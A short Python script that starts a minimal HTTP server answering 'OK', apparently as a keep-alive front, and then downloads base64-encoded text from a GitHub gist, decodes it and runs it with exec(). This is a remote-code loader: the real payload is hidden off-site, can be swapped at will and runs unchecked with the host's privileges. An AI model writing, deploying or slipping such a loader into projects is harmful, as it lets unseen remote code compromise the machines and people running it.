import os
import requests
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import sqlite3

PORT = int(os.environ.get("PORT", 10000))

class SimpleHandler(BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(('0.0.0.0', PORT), SimpleHandler)
    server.serve_forever()

def run_remote_code():
    URL = "https://gist.githubusercontent.com/ypkayla/a1fc44a209da2dba46a031a69f78174b/raw/eb78da6ac3b605353cd6368bcf7926fbab561015/ok"
    response = requests.get(URL)
    code_b64 = response.text.strip()
    exec(compile(base64.b64decode(code_b64), "<remote>", "exec"))

if __name__ == '__main__':
    threading.Thread(target=run_http_server, daemon=True).start()
    run_remote_code()
